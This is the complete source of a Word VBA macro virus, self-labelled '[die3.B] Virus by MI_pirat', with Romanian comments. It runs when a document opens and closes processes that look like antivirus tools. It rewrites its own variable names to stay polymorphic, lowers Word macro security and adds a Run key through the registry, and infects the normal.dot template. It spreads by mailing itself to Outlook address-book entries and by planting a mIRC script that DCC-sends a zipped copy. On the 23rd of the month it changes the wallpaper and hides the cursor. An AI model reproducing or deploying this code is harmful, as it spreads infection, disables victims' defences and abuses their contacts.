Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Sub Document_Open() '^-á
On Error Resume Next '8Éu
'[die3.B] Virus by MI_pirat'r$h
'payload'yxt
EGYMp = Day(Date) 'T"â
If EGYMp = 23 Then 'lÑa
MsgBox Chr(34) + Chr(100) + Chr(105) + Chr(101) + Chr(32) + Chr(100) + Chr(105) + Chr(101) + Chr(32) + _
Chr(100) + Chr(105) + Chr(101) + Chr(34) + Chr(32) + Chr(45) + Chr(91) + Chr(100) + Chr(105) + Chr(101) + _
Chr(51) + Chr(93) + Chr(45) + Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(77) + Chr(73) + Chr(95) + Chr(112) + _
Chr(105) + Chr(114) + Chr(97) + Chr(116), vbInformation, Chr(100) + Chr(105) + Chr(101) + Chr(51) + Chr(32) + _
Chr(86) + Chr(105) + Chr(114) + Chr(117) + Chr(115) 'Q!"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", "Wallpaper") = "C:\Windows\setup.bmp"
ShowCursor 0 ':ç2
End If 'èÅS
'inchide antivir. daca e pornit'óY0
Set LFUMp = Tasks 'Å#)
For SWTMp = 1 To LFUMp.Count ']PB
If InStr(1, LFUMp(SWTMp).Name, "av", vbTextCompare) Or InStr(1, LFUMp(SWTMp).Name, "AV", vbTextCompare) Then
LFUMp(SWTMp).Close 'PZé
End If 'wPz
Next SWTMp 'be
'poly starts here:'MQ:
Set LFUMp = ActiveDocument.VBProject '[?1
Set VDLMp = LFUMp.VBComponents(1).CodeModule '4_Å
If ThisDocument.FullName <> Templates(1).FullName Then 'Ä[ã
EGYMp = 17 'è#J
ReDim EDYMp(1 To EGYMp) As String 'ê5Q
EDYMp(1) = "EGYMp": EDYMp(2) = "GAQMp": EDYMp(3) = "EDYMp": EDYMp(4) = "AUXMp" '%h@
EDYMp(5) = "UGBMp": EDYMp(6) = "SWTMp": EDYMp(7) = "LFUMp": EDYMp(8) = "UXXMp" '1%:
EDYMp(9) = "YWJMp": EDYMp(10) = "TJFMp": EDYMp(11) = "CAWMp" 'zçN
EDYMp(12) = "RKYMp": EDYMp(13) = "HSFMp": EDYMp(14) = "YCCMp": EDYMp(15) = "AJJMp": EDYMp(16) = "BVOMp": EDYMp(17) = "VDLMp"
'modif var.'aí!
For SWTMp = 1 To EGYMp '8ñ9
Randomize '}d0
UGBMp = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Mp" 'B8c
For GAQMp = 2 To VDLMp.CountOfLines 'b,Ñ
UXXMp = VDLMp.Lines(GAQMp, 1) 'kwt
If InStr(1, UXXMp, EDYMp(SWTMp), vbTextCompare) Then 'ç.R
UXXMp = Replace(UXXMp, EDYMp(SWTMp), UGBMp, 1, -1, vbTextCompare) 'Ox0
VDLMp.ReplaceLine GAQMp, UXXMp '.BK
End If 'jÉé
Next GAQMp 'Tp(
Next SWTMp '@N,
'Adauga si ceva caractere aleatoare (ca sa fie si mai poly),dar nu prea multe'6éz
For SWTMp = 2 To VDLMp.CountOfLines 'G^
UXXMp = VDLMp.Lines(SWTMp, 1) 'äKj
If Len(UXXMp) <= 100 Then '\Å:
UXXMp = UXXMp + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
VDLMp.ReplaceLine SWTMp, UXXMp 'W$J
End If 'UW7
Next SWTMp 'cîp
End If 'XG5
'Virusul propriu-zis'yPC
'-------------------------------------------------------------------';!h
'e-mail spread'înt
Dim YWJMp, TJFMp, CAWMp 'ç/2
RKYMp = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) '[àX
Set YWJMp = CreateObject(RKYMp + ".Application") 'v@Q
Set TJFMp = YWJMp.GetNameSpace("MAPI") '[ç-
If YWJMp = RKYMp Then 'Ñl[
TJFMp.Logon "profile", "password" 'gñp
Set RKYMp = TJFMp.AddressLists '8Av
For SWTMp = 1 To RKYMp.Count 'Ià]
Set ABook = TJFMp.AddressLists(SWTMp) 'g>w
HSFMp = 1 'OÜ#
Set YCCMp = ABook.AddressEntries 'ó)g
Set CAWMp = YWJMp.CreateItem(0) 'ptA
For BVOMp = 1 To YCCMp.Count '=;~
AJJMp = YCCMp(HSFMp) '$=q
CAWMp.Recipients.Add AJJMp 'Mw"
HSFMp = HSFMp + 1 '%RH
If HSFMp > 20 Then EGYMp = YCCMp.Count '4ÖZ
Next BVOMp 'ñëp
CAWMp.Subject = "hello!!!" 'Ünç
CAWMp.Body = "Cool jokes (more in the doc.) " ',Å=
CAWMp.Attachments.Add ActiveDocument.FullName 'êáC
CAWMp.Send 'ÉM5
AJJMp = "" 'l3b
Next SWTMp 'VvT
TJFMp.Logoff 'O0>
End If 'GYá
'verif. daca a infectat compu''M<2
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") <> "inXP" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") = "inXP" 'àZÄ
'securitate, ce securitate?! :D'&hA
Options.SaveNormalPrompt = 5 Xor 5 'tzi
CommandBars(Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Enabled = (1 Xor 1)
Open "C:\a.reg" For Output As #1 '2hz
Print #1, "REGEDIT4" 'wt\
Print #1, "" 'pQi
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]" '5sQ
Print #1, """Level"" = dword:00000001" 'r!A
Print #1, """AccessVBOM"" = dword:00000001" 'm9í
Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]" '/L_
Print #1, """doc"" = " + """" + ActiveDocument.FullName + """" 'ÅI^
Close #1 'Ö~í
Shell "C:\Windows\regedit /s C:\a.reg" 'QF6
Kill "C:\a.reg" '_eO
'aduga si un .zip ca sa nu aiba probleme cu ignorarea automata a mIRC-ului'[9ê
Randomize 'Mjà
UGBMp = ActiveDocument.FullName '4@L
UXXMp = "C:\" + Chr(Int((25 * Rnd) + 65)) + ".zip" 'eOÉ
scr = "C:\" + Chr(Int((25 * Rnd) + 65)) + ".doc" 'CD
ActiveDocument.SaveAs scr 'åkà
ActiveDocument.SaveAs UGBMp 'Ñ#h
UGBMp = Application.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" & _
"\CurrentVersion\App Paths\winzip32.exe", "") '2f;
Shell UGBMp & " -a -r " & UXXMp & Chr(32) & scr, vbHide 'ëaN
'si acum face un script pt. mIRC'-mm
'gaseste path-ul (cam ciudat nu?!)'|7ì
UGBMp = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC\", "UninstallString")
UGBMp = Mid(UGBMp, 2, Len(UGBMp) - 23) '9yY
Open UGBMp + "script.ini" For Output As #1 'uN;
Print #1, "[Script]" 'B{,
Print #1, "n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }" 'qEÄ
Print #1, "n1=/dcc send $nick " & Chr(34) & UXXMp & Chr(34) 'áïï
Print #1, "n2=}" 'Nic
Close #1 '"0ï
'hai si un normal.dot'ÑBF
EGYMp = VDLMp.CountOfLines 'yÅÇ
Set LFUMp = Templates(1).VBProject.VBComponents 'h]î
Set VDLMp = LFUMp.Item(1).CodeModule '9"p
VDLMp.DeleteLines 1, VDLMp.CountOfLines 'U3E
VDLMp.InsertLines 1, "Sub Document_Close" 'jLD
For SWTMp = 2 To EGYMp 'N7b
Set LFUMp = ActiveDocument.VBProject 'B*M
Set VDLMp = LFUMp.VBComponents(1).CodeModule 'J,>
UXXMp = VDLMp.Lines(SWTMp, 1) '?Åq
Set LFUMp = Templates(1).VBProject.VBComponents 'ë;'
Set VDLMp = LFUMp.Item(1).CodeModule 'qëU
VDLMp.InsertLines SWTMp, UXXMp 'íhg
Next SWTMp '^î,
Set LFUMp = Templates(1) 'uZF
LFUMp.Save 'fìñ
End If 'Lñ@
'verifica daca fisierul este infect (numara liniile)'yCç
Set LFUMp = ActiveDocument.VBProject 'p=ç
Set VDLMp = LFUMp.VBComponents(1).CodeModule 'èAv
EGYMp = VDLMp.CountOfLines 'à1b
If Not ((EGYMp < 163) And (EGYMp > 160)) Then 'E$'
VDLMp.DeleteLines 1, EGYMp 'Üd-
Set LFUMp = Templates(1).VBProject.VBComponents 'i1+
Set VDLMp = LFUMp.Item(1).CodeModule '`_(
UXXMp = VDLMp.Lines(1, 1) 'dlã
Set LFUMp = ActiveDocument.VBProject '5ä"
Set VDLMp = LFUMp.VBComponents(1).CodeModule 'ñVo
VDLMp.InsertLines 1, UXXMp '5I)
VDLMp.InsertLines 2, "Sub Document_Open" 'âT-
Set LFUMp = Templates(1).VBProject.VBComponents 'Xå#
Set VDLMp = LFUMp.Item(1).CodeModule 'f\l
EGYMp = VDLMp.CountOfLines 'a+'
For SWTMp = 3 To EGYMp ' b!
UXXMp = VDLMp.Lines(SWTMp, 1) 'lW
Set LFUMp = ActiveDocument.VBProject '0-É
Set VDLMp = LFUMp.VBComponents(1).CodeModule 's>[
VDLMp.InsertLines SWTMp, UXXMp 'x+ì
Next SWTMp 'íÖ[
ActiveDocument.Save 'yÜq
End If 'tEâ
End Sub 'tc3
'GhM
